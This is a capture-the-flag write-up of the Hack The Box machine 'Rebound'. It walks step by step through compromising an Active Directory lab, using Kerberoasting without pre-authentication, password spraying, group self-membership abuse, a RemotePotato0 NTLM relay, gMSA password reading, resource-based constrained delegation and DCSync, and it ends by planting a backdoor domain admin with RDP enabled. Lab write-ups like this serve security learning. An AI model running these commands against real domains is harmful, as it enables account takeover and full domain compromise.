---
description: Active Directory! Had some help after it ended.
---

# Rebound

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 10.129.148.205         
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-12 16:28 +08
Nmap scan report for 10.129.148.205
Host is up (0.16s latency).
Not shown: 65315 closed tcp ports (conn-refused), 194 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49671/tcp open  unknown
49686/tcp open  unknown
49687/tcp open  unknown
49688/tcp open  unknown
49705/tcp open  unknown
49706/tcp open  unknown
49723/tcp open  unknown
63777/tcp open  unknown
```

Did a detailed scan on the main services too:

```
$ nmap -p 53,88,135,139,389,445,464,593,636,3268,3269 -sC -sV --min-rate 3000 10.129.148.205
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-12 16:31 +08
Nmap scan report for 10.129.148.205
Host is up (0.17s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-09-12 15:31:08Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-09-12T15:31:59+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.rebound.htb
| Not valid before: 2023-08-25T22:48:10
|_Not valid after:  2024-08-24T22:48:10
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.rebound.htb
| Not valid before: 2023-08-25T22:48:10
|_Not valid after:  2024-08-24T22:48:10
|_ssl-date: 2023-09-12T15:31:59+00:00; +7h00m00s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-09-12T15:31:59+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.rebound.htb
| Not valid before: 2023-08-25T22:48:10
|_Not valid after:  2024-08-24T22:48:10
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-09-12T15:31:59+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.rebound.htb
| Not valid before: 2023-08-25T22:48:10
|_Not valid after:  2024-08-24T22:48:10
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-time: 
|   date: 2023-09-12T15:31:53
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
```

We can take note of the root domain name of `rebound.htb` and the DC name.&#x20;

### AD Enum --> AS-REP Fail

Used `enum4linux` to first scan to see if I can find anything using NULL sessions, which I can:

```
$ enum4linux -u 'guest' -p '' -a rebound.htb
==================================( Share Enumeration on rebound.htb )==================================                                                                                 
                                                                                             
do_connect: Connection to rebound.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)       

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Shared          Disk      
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on rebound.htb                                                  
                                                                                             
//rebound.htb/ADMIN$    Mapping: DENIED Listing: N/A Writing: N/A                            
//rebound.htb/C$        Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:                                                               
                                                                                             
NT_STATUS_NO_SUCH_FILE listing \*                                                            
//rebound.htb/IPC$      Mapping: N/A Listing: N/A Writing: N/A
//rebound.htb/NETLOGON  Mapping: OK Listing: DENIED Writing: N/A
//rebound.htb/Shared    Mapping: OK Listing: OK Writing: N/A
//rebound.htb/SYSVOL    Mapping: OK Listing: DENIED Writing: N/A
```

`smbmap` says we have read access over the `Shared` share:

```
$ smbmap -u 'guest' -p '' -H rebound.htb
[+] IP: rebound.htb:445 Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Shared                                                  READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share
```

However, there's nothing within it:

```
$ smbclient -U guest //rebound.htb/Shared   
Password for [WORKGROUP\guest]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Aug 26 05:46:36 2023
  ..                                  D        0  Sat Aug 26 05:46:36 2023

                4607743 blocks of size 4096. 885410 blocks available
```

`enum4linux` also proceeded to enumerate SIDs out, which did return some but it was really slow. So, I changed to using `crackmapexec` to enumerate the users out:

```
$ crackmapexec smb rebound.htb -u 'guest' -p '' --rid-brute 5000
SMB         rebound.htb     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
SMB         rebound.htb     445    DC01             [+] rebound.htb\guest: 
SMB         rebound.htb     445    DC01             [+] Brute forcing RIDs
SMB         rebound.htb     445    DC01             498: rebound\Enterprise Read-only Domain Controllers (SidTypeGroup)                                                                   
SMB         rebound.htb     445    DC01             500: rebound\Administrator (SidTypeUser)
SMB         rebound.htb     445    DC01             501: rebound\Guest (SidTypeUser)
SMB         rebound.htb     445    DC01             502: rebound\krbtgt (SidTypeUser)
SMB         rebound.htb     445    DC01             512: rebound\Domain Admins (SidTypeGroup)
SMB         rebound.htb     445    DC01             513: rebound\Domain Users (SidTypeGroup)
SMB         rebound.htb     445    DC01             514: rebound\Domain Guests (SidTypeGroup)
SMB         rebound.htb     445    DC01             515: rebound\Domain Computers (SidTypeGroup)                                                                                          
SMB         rebound.htb     445    DC01             516: rebound\Domain Controllers (SidTypeGroup)                                                                                        
SMB         rebound.htb     445    DC01             517: rebound\Cert Publishers (SidTypeAlias)                                                                                           
SMB         rebound.htb     445    DC01             518: rebound\Schema Admins (SidTypeGroup)
SMB         rebound.htb     445    DC01             519: rebound\Enterprise Admins (SidTypeGroup)                                                                                         
SMB         rebound.htb     445    DC01             520: rebound\Group Policy Creator Owners (SidTypeGroup)                                                                               
SMB         rebound.htb     445    DC01             521: rebound\Read-only Domain Controllers (SidTypeGroup)                                                                              
SMB         rebound.htb     445    DC01             522: rebound\Cloneable Domain Controllers (SidTypeGroup)                                                                              
SMB         rebound.htb     445    DC01             525: rebound\Protected Users (SidTypeGroup)                                                                                           
SMB         rebound.htb     445    DC01             526: rebound\Key Admins (SidTypeGroup)
SMB         rebound.htb     445    DC01             527: rebound\Enterprise Key Admins (SidTypeGroup)                                                                                     
SMB         rebound.htb     445    DC01             553: rebound\RAS and IAS Servers (SidTypeAlias)                                                                                       
SMB         rebound.htb     445    DC01             571: rebound\Allowed RODC Password Replication Group (SidTypeAlias)                                                                   
SMB         rebound.htb     445    DC01             572: rebound\Denied RODC Password Replication Group (SidTypeAlias)                                                                    
SMB         rebound.htb     445    DC01             1000: rebound\DC01$ (SidTypeUser)
SMB         rebound.htb     445    DC01             1101: rebound\DnsAdmins (SidTypeAlias)
SMB         rebound.htb     445    DC01             1102: rebound\DnsUpdateProxy (SidTypeGroup)                                                                                           
SMB         rebound.htb     445    DC01             1951: rebound\ppaul (SidTypeUser)
SMB         rebound.htb     445    DC01             2952: rebound\llune (SidTypeUser)
SMB         rebound.htb     445    DC01             3382: rebound\fflock (SidTypeUser)
SMB         rebound.htb     445    DC01             5277: rebound\jjones (SidTypeUser)
SMB         rebound.htb     445    DC01             5569: rebound\mmalone (SidTypeUser)
SMB         rebound.htb     445    DC01             5680: rebound\nnoon (SidTypeUser)
SMB         rebound.htb     445    DC01             7681: rebound\ldap_monitor (SidTypeUser)
SMB         rebound.htb     445    DC01             7682: rebound\oorend (SidTypeUser)
SMB         rebound.htb     445    DC01             7683: rebound\ServiceMgmt (SidTypeGroup)
SMB         rebound.htb     445    DC01             7684: rebound\winrm_svc (SidTypeUser)
SMB         rebound.htb     445    DC01             7685: rebound\batch_runner (SidTypeUser)
SMB         rebound.htb     445    DC01             7686: rebound\tbrady (SidTypeUser)
SMB         rebound.htb     445    DC01             7687: rebound\delegator$ (SidTypeUser)
```

Lots of users and groups, but most importantly we have some users. With a username list, we can try AS-REP Roasting without credentials.&#x20;

{% code overflow="wrap" %}
```
$ impacket-GetNPUsers -request -usersfile users.txt -dc-ip dc01.rebound.htb rebound.htb/
$krb5asrep$23$jjones@REBOUND.HTB:f5cb26a6a085535088c973a3cd42eaa0$1fff50bbcd21154e94b1b193ef38d5b1a552ca9b2ca2b601c1674db240ae8f8500181cf6112f43ce2b2ced4e9f62d7a6818ddd06e30e6d76ad3ffde8808a0fb8fafbb1222b2fe403e9e3f4ee5c1c04eefae8fadd17a950e7a7aec6ca4f77d902396462183d963f6aab8a269a31f5c25dbffc9e48a265a5f973e4da1e42824c3670ae65a44cd3cac57e0ce500ac3d85effa45dc1c8ae88b3189f81fbd75ac94ccadc62b2f8acca9bce3917c3e9f18f9188707e18c717cdb20f0c3add2ca7b46013d42a2194a5fd9c60eac695c4f335fece76078bd34f4bcdd29a7414c4913154d52da57343ce710427a14
```
{% endcode %}

However, this hash cannot be cracked for some reason.&#x20;

### Kerberoast W/O Pre-Auth --> Password

I googled a bit more about what I could do with `jjones` account since it doesn't have the PreAuth flag set for it. Came across a new Kerberoast method I didn't use before:

{% embed url="https://www.thehacker.recipes/ad/movement/kerberos/kerberoast#undefined" %}

The edited files can be found here:

{% embed url="https://github.com/fortra/impacket/pull/1413" %}

Using this method, we can try using `GetUserSPNs.py` to find a hash:

```
$ GetUserSPNs.py -no-preauth 'jjones' -target-domain rebound.htb -usersfile users.txt -dc-ip dc01.rebound.htb rebound.htb/guest -no-pass
$krb5tgs$23$*ldap_monitor$REBOUND.HTB$ldap_monitor*$<TRUNCATED>
$krb5tgs$18$delegator$$REBOUND.HTB$*delegator$*$<TRUNCATED>
```

We get 2 hashes using this method, one for `ldap_monitor` and one for `delegator`. `john` is able to crack the hash for `ldap_monitor`.

```
$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
<REDACTED>     (?)     
1g 0:00:00:04 DONE (2023-09-13 00:17) 0.2066g/s 2694Kp/s 2694Kc/s 2694KC/s 1Gobucs!..1DENA
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

### Bloodhound + Password Spray + Thinking

Using these credentials, we can use `bloodhound-python` to enumerate the entire domain. Running it the first time reveals that `gmsa.rebound.htb` is another domain we need to add to the `hosts` file. Afterwards, we can run it to collect information about the domain:

{% code overflow="wrap" %}
```
$ bloodhound-python -u ldap_monitor -p <REDACTED> -d rebound.htb -ns 10.129.148.205 -c all
```
{% endcode %}

Afterwards, we can upload the information to Bloodhound. From it, `winrm_svc` seems to be the next user we have to compromise:

<figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

The `ServiceMgmt` group was also found to have some interesting privileges:

<figure><img src="../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

Other than that, Bloodhound provided nothing of use since we aren't part of the `ServiceMgmt` group. I spent quite a bit of time thinking about how the user we compromised was called `ldap_monitor`, and what we could do with LDAP.&#x20;

Attempting to use `ldapdomaindump` shows that we need 'stronger auth':

{% code overflow="wrap" %}
```
$ ldapdomaindump 10.129.148.205 -u 'rebound\ldap_monitor' -p <TRUNCATED> --no-json --no-grep
[*] Connecting to host...
[*] Binding to host
[!] Could not bind with specified credentials
[!] {'result': 8, 'description': 'strongerAuthRequired', 'dn': '', 'message': '00002028: LdapErr: DSID-0C090259, comment: The server requires binds to turn on integrity checking if SSL\\TLS are not already active on the connection, data 0, v4563\x00', 'referrals': None, 'saslCreds': None, 'type': 'bindResponse'}
```
{% endcode %}

Since we still had a username list, I thought to try password spraying with the password I found, and I found another user with the same password:

```
$ crackmapexec smb rebound.htb -u users.txt -p <TRUNCATED> 
<TRUNCATED>
SMB         rebound.htb     445    DC01             [+] rebound.htb\oorend:<TRUNCATED>
```

This user does have access to more shares:

```
$ smbmap -u 'oorend' -p <TRUNCATED> -H rebound.htb
[+] IP: rebound.htb:445 Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        Shared                                                  READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share
```

At this stage, I kept thinking about **why** the user we could compromise is called `ldap_monitor`, until I googled a bit more about it.

### LDAP Monitor --> Change Password

Turns out this is an actual program we can use to monitor the LDAP traffic on the domain, sort of like Wireshark for LDAP.

{% embed url="https://github.com/p0dalirius/LDAPmonitor" %}

When we take the script, I realised it doesn't work properly due to the requiring of 'stronger authentication'. Using the `-use-ldaps` flag doesn't work as well either, because it just says we have invalid credentials.

Since we have the credentials of the user, we can actually grab a Kerberos ticket:

```
$ impacket-getTGT rebound.htb/ldap_monitor:<TRUNCATED>
$ export KRB5CCNAME=ldap_monitor.ccache
```

Afterwards, we can use these flags to make it work properly and view the following LDAP changes:

```
$ python3 pyLDAPmonitor.py -d rebound.htb -u ldap_monitor -p <TRUNCATED> --use-ldaps --dc-ip 10.129.148.205 -k
[+]======================================================
[+]    LDAP live monitor v1.3        @podalirius_        
[+]======================================================

[>] Trying to connect to dc01.rebound.htb ...
[debug] Using Kerberos Cache: ldap_monitor.ccache
[debug] Using TGT from cache
[>] Listening for LDAP changes ...
```

Eventually, something like this appears:

```
[2023-09-13 01:20:01] CN=winrm_svc,OU=Service Users,DC=rebound,DC=htb
 | Attribute "whenChanged" changed from '['20230912171808.0Z']' to '['20230912172101.0Z']'
 | Attribute "uSNChanged" changed from '['172543']' to '['172548']'
 | Attribute "pwdLastSet" changed from '['133390126205436306']' to '['133390128605841076']'
 | Attribute "dSCorePropagationData" changed from '['20230912171810.0Z', '20230912171808.0Z', '20230912171801.0Z', '20230912171701.0Z', '16010101000000.0Z']' to '['20230912172101.0Z', '20230912171810.0Z', '20230912171808.0Z', '20230912171801.0Z', '16010101000000.0Z']'           
[2023-09-13 01:20:01] CN=batch_runner,OU=Service Users,DC=rebound,DC=htb
 | Attribute "whenChanged" changed from '['20230912171804.0Z']' to '['20230912172101.0Z']'
 | Attribute "uSNChanged" changed from '['172542']' to '['172551']'
 | Attribute "pwdLastSet" changed from '['133390126212467622']' to '['133390128616355941']'
 | Attribute "dSCorePropagationData" changed from '['20230912171810.0Z', '20230912171804.0Z', '20230912171801.0Z', '20230912171701.0Z', '16010101000000.0Z']' to '['20230912172101.0Z', '20230912171810.0Z', '20230912171804.0Z', '20230912171801.0Z', '16010101000000.0Z']
```

The `pwdLastSet` is being edited to a more recent time, meaning that there's something resetting the password of these users. The `winrm_svc` user is the next step, so perhaps we have to change that password to login.

Based on Bloodhound, we need to be part of the `ServiceMgmt` group to have `GenericAll` privileges over `winrm_svc`, and we can use that to change the password of the user.&#x20;

I tried the exploit with `ldap_monitor`, but it doesn't work with it. We can only use `oorend` to exploit this misconfiguration. Searching for tools to exploit this led to `bloodyAD.py`:

{% embed url="https://github.com/CravateRouge/bloodyAD" %}

I tried adding the `oorend` user to the `ServiceMgmt` group, and it surprisingly worked.&#x20;

```
$ bloodyAD.py -u oorend -p <PASS> -d rebound.htb --host 10.129.68.225 add groupMember SERVICEMGMT oorend
[+] oorend added to SERVICEMGMT
```

From here, what we can do is attempt to give `oorend` `GenericAll` privilege over the OU for Service Users, and from there set the password of the `winrm_svc` user to something else:

{% code overflow="wrap" %}
```
$ python bloodyAD.py -d rebound.htb -u oorend -p <PASS> --host dc01.rebound.htb add genericAll 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' oorend
$ python bloodyAD.py -d rebound.htb -u oorend -p <PASS> --host dc01.rebound.htb set password winrm_svc 'Pa$$w0rd'
```
{% endcode %}

Afterwards, we can `evil-winrm` in as the user:

<figure><img src="../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

I should note that because the box resets the passwords of `winrm_svc` user regularly, the `evil-winrm` shell dies pretty often.&#x20;

### Enumeration

Earlier in Bloodhound, we saw that the `tbrady` user has `ReadGMSAPassword` over the `gmsa.rebound.htb` domain, so they are probably the next step.&#x20;

Fortunately, no defences were present on the box and I could download `PowerView.ps1` to enumerate stuff. When enumerating Kerberos, I found that the `delegator$` computer user had some delegation rights for the DC:

```
*Evil-WinRM* PS C:\Users\winrm_Svc\documents> Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

userprincipalname name      msds-allowedtodelegateto
----------------- ----      ------------------------
                  delegator http/dc01.rebound.htb
```

This is probably the last step to `root`, so we'll keep this in mind. I also ran a `SharpHound.exe` on the machine itself and updated my Bloodhound database. When taking a look at all the parts of `tbrady` noticed this:

<figure><img src="../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

The user has a session on the DC, and this might be exploitable as we could potentially steal credentials. There weren't any other leads I found, so I went along with this.&#x20;

### Remote Potato --> Tbrady Hash --> ReadGMSAPassword

I got some help from another HTB member, who told me that I should look towards thinking about how logged on users can be exploited, and I googled around to find this repo:

{% embed url="https://github.com/antonioCoco/RemotePotato0" %}

The above tool would potentially allow us to steal the NTLM hash of the `tbrady` user. To set it up, first we have to create a `socat` listener and `impacket-ntlmrelayx` listener based on the instructions from the repo:

```bash
sudo socat TCP-LISTEN:135,fork,reuseaddr TCP:10.129.68.227:9999 &
sudo impacket-ntlmrelayx -t ldap://10.10.14.41 --no-wcf-server --escalate-user winrm_svc
```

Afterwards, simply run the binary on the machine:

```
.\RemotePotato0.exe -m 2 -s 1 -x 10.10.14.41 -p 9999
```

This would give us the hash of the `tbrady` user:

<figure><img src="../../.gitbook/assets/image (4212).png" alt=""><figcaption></figcaption></figure>

`john` can crack this hash to give the password of `tbrady`. Now that we have the password of `tbrady`, we can abuse the `ReadGMSAPassword` privileges given. Using `bloodyAD.py`, we can easily do this:

```
$ ./bloodyAD.py -u tbrady -d rebound.htb -p <PASS> --host dc01.rebound.htb get object 'delegator$' --attr msDS-ManagedPassword
```

The reason why `delegator$` is used is because we it has delegation privileges over the DC.

### Constrained Delegation --> Root

We must remember that `delegator$` is a machine account instead of a user account. We can re-confirm the constrained delegation misconfiguration using PowerView:

```
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> Get-NetComputer -TrustedToAuth


pwdlastset                     : 9/16/2023 2:04:28 AM
logoncount                     : 14
badpasswordtime                : 4/8/2023 9:22:25 AM
msds-managedpasswordpreviousid : {1, 0, 0, 0...}
distinguishedname              : CN=delegator,CN=Managed Service Accounts,DC=rebound,DC=htb
objectclass                    : {top, person, organizationalPerson, user...}
lastlogontimestamp             : 4/8/2023 11:12:56 AM
name                           : delegator
objectsid                      : S-1-5-21-4078382237-1492182817-2568127209-7687
msds-groupmsamembership        : {1, 0, 4, 128...}
localpolicyflags               : 0
codepage                       : 0
samaccounttype                 : MACHINE_ACCOUNT
accountexpires                 : NEVER
countrycode                    : 0
whenchanged                    : 9/16/2023 9:04:28 AM
instancetype                   : 4
usncreated                     : 69353
objectguid                     : c9da97ae-5e35-44d2-aa15-114aecdc0caf
msds-managedpasswordid         : {1, 0, 0, 0...}
msds-allowedtodelegateto       : http/dc01.rebound.htb
samaccountname                 : delegator$
objectcategory                 : CN=ms-DS-Group-Managed-Service-Account,CN=Schema,CN=Configuration,DC=rebound,DC=htb
dscorepropagationdata          : 1/1/1601 12:00:00 AM
serviceprincipalname           : browser/dc01.rebound.htb
msds-managedpasswordinterval   : 30
lastlogon                      : 4/9/2023 3:25:20 AM
badpwdcount                    : 0
cn                             : delegator
useraccountcontrol             : WORKSTATION_TRUST_ACCOUNT
whencreated                    : 4/8/2023 9:08:31 AM
primarygroupid                 : 515
iscriticalsystemobject         : False
msds-supportedencryptiontypes  : 28
usnchanged                     : 173699
lastlogoff                     : 12/31/1600 4:00:00 PM
dnshostname                    : gmsa.rebound.htb
```

We have the NTLM hash of this `delegator$` user. I found that abusing delegation without the `msds-AllowedToActOnBehalfOfOtherIdentity` property was not possible, and as such I focused on enabling this property.&#x20;

{% hint style="info" %}
From this point on, someone offered me some help. Whoever you are, thank you!
{% endhint %}

Their method involved the following:

* Requesting a TGT using the NTLM hash for `delegator$`.&#x20;
* Using that ticket to allow delegation from `ldap_monitor` to `delegator$` through RBCD.&#x20;
* Requesting ticket for `ldap_monitor` and then proceeding with regular constrained delegation stuff to get a ticket for `dc01$`.&#x20;

The part I was stuck on was the RBCD part, since I had no idea why we had to use `ldap_monitor` to do so. I'll attempt to cover these later.&#x20;

First, let's get the ticket needed:

{% code overflow="wrap" %}
```
$ sudo ntpdate -S dc01.rebound.htb
$ impacket-getTGT 'rebound.htb/delegator$@rebound.htb' -hashes <NTLM>
$ export KRB5CCNAME=delegator\$@dc01.rebound.htb.ccache
```
{% endcode %}

Afterwards, we can use `impacket-rbcd` for this:

{% code overflow="wrap" %}
```
$ impacket-rbcd -k -no-pass 'rebound.htb/delegator$@rebound.htb' -delegate-to 'delegator$' -use-ldaps -debug -action write -delegate-from ldap_monitor
```
{% endcode %}

Then, we can request a ticket as `ldap_monitor` using the password we have earlier (same as `oorend`).

```
$ impacket-getTGT 'rebound.htb/ldap_monitor:<PASS>' 
$ export KRB5CCNAME=ldap_minitor.ccache
```

Now we need to request a Service Ticket as the `delegator$` user and impersonate `dc01$`. Based on Bloodhound, this user has a SPN of `browser/dc01.rebound.htb`:

<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
$ impacket-getST -spn 'browser/dc01.rebound.htb' -impersonate 'dc01' 'rebound.htb/ldap_monitor' -k -no-pass
```
{% endcode %}

Then, use this ST to request for the TGT for `dc01$`.&#x20;

{% code overflow="wrap" %}
```
$ impacket-getST -spn 'http/dc01.rebound.htb' -impersonate 'dc01$' -additional-ticket 'dc01$.ccache' 'rebound.htb/delegator$' -k -no-pass
```
{% endcode %}

Afterwards, we can do a DCSync since we have the domain admin ticket to grab the NTLM hash of the administrator and `evil-winrm` in:

```
$ impacket-secretsdump -no-pass -k dc01.rebound.htb -just-dc-ntlm 
```

<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

Here are some of the resources linked in the writeup sent to me, good reads overall:

{% embed url="https://snovvcrash.rocks/2022/03/06/abusing-kcd-without-protocol-transition.html" %}

{% embed url="https://blog.netwrix.com/2022/09/29/resource-based-constrained-delegation-abuse/" %}

## Further Enumeration

There were 2 things I was puzzled about:

1. Why did adding `oorend` to the `ServiceMgmt` group work?
2. Why did we have to use `ldap_monitor` for the last step? I was stuck here because I kept trying with `oorend`.&#x20;

### Self ServiceMgmt Group

I downloaded `PowerView.ps1` to the machine and enumerated it further as the domain admin. There was probably something that the `oorend` user had that could not be found using Bloodhound. When enumerating the ACLs for the `ServiceMgmt` group, I came across this:

{% code overflow="wrap" %}
```
*Evil-WinRM* PS C:\Users\Administrator\Documents> Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb"}

<TRUNCATED> 
AceType               : AccessAllowed
ObjectDN              : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
ActiveDirectoryRights : Self
OpaqueLength          : 0
ObjectSID             : S-1-5-21-4078382237-1492182817-2568127209-7683
InheritanceFlags      : None
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-4078382237-1492182817-2568127209-7682
AccessMask            : 8
AuditFlags            : None
AceFlags              : None
AceQualifier          : AccessAllowed

*Evil-WinRM* PS C:\Users\Administrator\Documents> ConvertFrom-SID S-1-5-21-4078382237-1492182817-2568127209-7682
rebound\oorend
```
{% endcode %}

So all along, the `oorend` user had `Self` privileges over this group, which explains why we could add our user into the group via `bloodyAD.py`.&#x20;

{% embed url="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces#self-self-membership-on-group" %}

The weird part was that Bloodhound failed to pick this up at all. I ran `SharpHound.exe` again to check, but it still didn't reveal it. This might be intended, since this is an Insane machine and it does require some degree of 'educated guesswork' to finish, as with most other Insane machines I've attempted.&#x20;

### Delegation Issues --> SPN

To enumerate this, I just enabled RDP and created another domain admin user:

{% code overflow="wrap" %}
```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
net user rdpuser Password@123 /add /domain
net localgroup "Remote Desktop Users" rdpuser /add
net localgroup "Administrators" rdpuser /add
net group "Domain Admins" rdpuser /add /domain
```
{% endcode %}

Afterwards, I used `xfreerdp` to get in:

```
$ xfreerdp /u:rdpuser /p:Password@123 /v:10.129.197.120
```

When viewing the delegation settings, I noticed that `ldap_monitor` had the Delegation tab:

<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

The `oorend` user did not have this tab:

<figure><img src="../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

For some reason, `ldap_monitor` was technically allowed to delegate and the `oorend` user was not. I found few resources that explained this well, but basically it seems that `ldap_monitor` does have an SPN:

{% embed url="https://dirteam.com/tomek/2010/03/17/delegation-tab-missing-in-adu-amp-c/" %}

{% embed url="https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/configure-kerberos-delegation-group-managed-service-accounts" %}

<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

This means that delegation is 'possible' for `ldap_monitor` because it has an SPN set, whereas `oorend` does not and cannot even process the Kerberos ticket. No wonder I was stuck.
